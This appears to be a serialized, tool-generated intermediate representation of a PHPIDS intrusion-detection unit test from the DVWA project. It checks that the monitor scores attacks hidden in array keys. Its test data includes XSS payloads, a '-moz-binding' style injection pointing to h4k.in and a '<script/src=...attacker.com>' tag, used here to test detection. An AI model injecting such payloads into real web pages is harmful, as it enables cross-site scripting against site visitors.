@@ -1,0 +1,94 @@
+
+(ids_monitortest::testlistwithkeyscanning_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpà à(+"1*é
+2
+MonitorTest.php"v
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpî î(
+implicit return*ï
+1_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpâ â(qo
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpâ â(
+%1"$Array~
+|
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpâ â(
+	$exploits"__id*
+
+%1—
+Œ
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpä ä(
+%2"__mapSet*
+
+	$exploits*	
+test1*A?
+=" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="≥
+∞
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpã ã(
+%3"__mapSet*
+
+	$exploits*	
+test2*#!
+9<script/src=http/attacker.com>Õ
+ 
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpå å(4
+%4"__mapSet*
+
+	$exploits*#!
+9<script/src=http/attacker.com>*#!
+9<script/src=http/attacker.com>è
+å
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpè è(
+%5"__id**
+ids_monitortest"
+inityw
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpç ê(	
+$test"ids_monitor¶
+£
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpç ê(	
+%6"ids_monitor::__construct*	
+
+$test*
+
+	$exploits*
+
+%5ã
+à
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpë ë(
+
+$test"
+
+scanKeys"__id*
+trueyw
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpí í(
+%7*	
+
+$test2run|
+z
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpí í(	
+$result"__id*
+
+%7Å
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpì  ì(4
+%8*
+	
+$result2	getimpactõò
+_
+S/Users/contardoacuna/repositorio/DVWA/external/phpids/0.6/tests/IDS/MonitorTest.phpì ì(5
+%9*
+ids_monitortest*2)*
+
+%82assertequals*
+2B
+ids_monitortest
